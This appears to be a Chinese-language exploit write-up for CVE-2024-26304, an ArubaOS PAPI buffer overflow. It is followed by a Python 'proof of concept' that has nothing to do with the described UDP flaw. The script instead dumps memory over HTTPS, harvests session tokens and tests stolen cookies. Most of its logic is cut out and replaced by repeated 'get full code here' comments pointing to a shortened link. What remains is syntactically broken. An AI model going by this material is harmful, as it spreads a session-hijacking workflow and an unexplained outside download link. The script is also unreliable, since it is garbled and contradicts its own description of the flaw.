## ArubaOS-RCE漏洞(CVE-2024-26304)

底层 L2/L3 管理服务中存在缓冲区溢出漏洞，可能会通过发送发往 PAPI（Aruba 接入点管理协议）UDP 端口 (8211) 的特制数据包，导致未经身份验证的远程代码执行。成功利用此漏洞可以导致以特权用户身份在底层操作系统上执行任意代码。

## poc

```python
import re
import sys
import hexdump
import argparse
import requests

from rich.console import Console
from urllib.parse import urlparse
from alive_progress import alive_bar
from typing import List, Tuple, Optional, TextIO
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings = requests.packages.urllib3
warnings.disable_warnings(warnings.exceptions.InsecureRequestWarning)

class ArubaRCE:
    
    def __init__(self):
        self.console = Console()
        self.parser = argparse.ArgumentParser(description='ArubaRCE')
        self.setup_arguments()
        self.results: List[Tuple[str, str]] = []
        self.output_file: Optional[TextIO] = None
        if self.args.output:
            self.output_file = open(self.args.output, 'w')

    def setup_arguments(self) -> None:
        self.parser.add_argument('-u', '--url', help='The ArubaRCE / Gateway target (e.g., https://192.168.1.200)')
        self.parser.add_argument('-f', '--file', help='File containing a list of target URLs (one URL per line)')
        self.parser.add_argument('-o', '--output', help='File to save the output results')
        self.parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')
        self.parser.add_argument('--only-valid', action='store_true', help='Only show results with valid sessions')
        self.args = self.parser.parse_args()
        
    def print_results(self, header: str, result: str) -> None:
        if self.args.only_valid and "[+]" not in header:
            return

        formatted_msg = f"{header} {result}"
        self.console.print(formatted_msg, style="white")
        if self.output_file:
            self.output_file.write(result + '\n')

    def normalize_url(self, url: str) -> str:
        if not url.startswith("http://") and not url.startswith("https://"):
            url = f"https://{url}"
        
        parsed_url = urlparse(url)
        normalized_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        return normalized_url

    def dump_memory(self, url: str) -> None:
        full_url = self.normalize_url(url)
        headers = {
            # [REDACTED. Get full code here https://t.ly/C1-D1]
            print("Headers:", headers)
        }

        try:
            r = requests.get(
                f"{full_url}/oauth/redacted", # [REDACTED. Get full code here https://t.ly/C1-D1]
                headers=headers,
                verify=False,
                timeout=10
            )
            content_bytes = r.content

            if r.status_code == 200 and content_bytes:
                # [REDACTED. Get full code here https://t.ly/C1-D1]
                print("Content bytes:", content_bytes)
        
        except Exception as e:
            print("Error:", e)

    def clean_bytes(self, data: bytes) -> bytes:
        # [REDACTED. Get full code here https://t.ly/C1-D1]
        print("Cleaning bytes...")

    def find_session_tokens(self, content_bytes: bytes) -> List[str]:
        # [REDACTED. Get full code here https://t.ly/C1-D1]
        print("Finding session tokens...")

    def test_session_cookie(self, url: str, session_token: str) -> bool:
        headers = {
            "Cookie": f"[REDACTED. Get full code here https://t.ly/C1-D1]={session_token}"
        }
        try:
            r = requests.post(
                # [REDACTED. Get full code here https://t.ly/C1-D1]
            )
            # [REDACTED. Get full code here https://t.ly/C1-D1]
            print("Session cookie test result:", result)
            return result
        
        except Exception as e:
            print("Error:", e)
            return False

    def run(self) -> None:
        if self.args.url:
    # [REDACTED. Get full code here https://t.ly/C1-D1]
            for header, result in self.results:
                self.print_results(header, result)
        elif self.args.file:
    # [REDACTED. Get full code here https://t.ly/C1-D1]
            pass  # Placeholder for code execution for file processing  
        else:
            self.console.print("[bold red][-][/bold red] URL or File must be provided.", style="white")
            sys.exit(1)

        
        if self.output_file:
            self.output_file.close()

if __name__ == "__main__":
    getRCE = ArubaRCE()
    getRCE.run()
```



## 漏洞来源

- https://github.com/Roud-Roud-Agency/CVE-2024-26304-RCE-exploits
- https://www.tenable.com/cve/CVE-2024-26304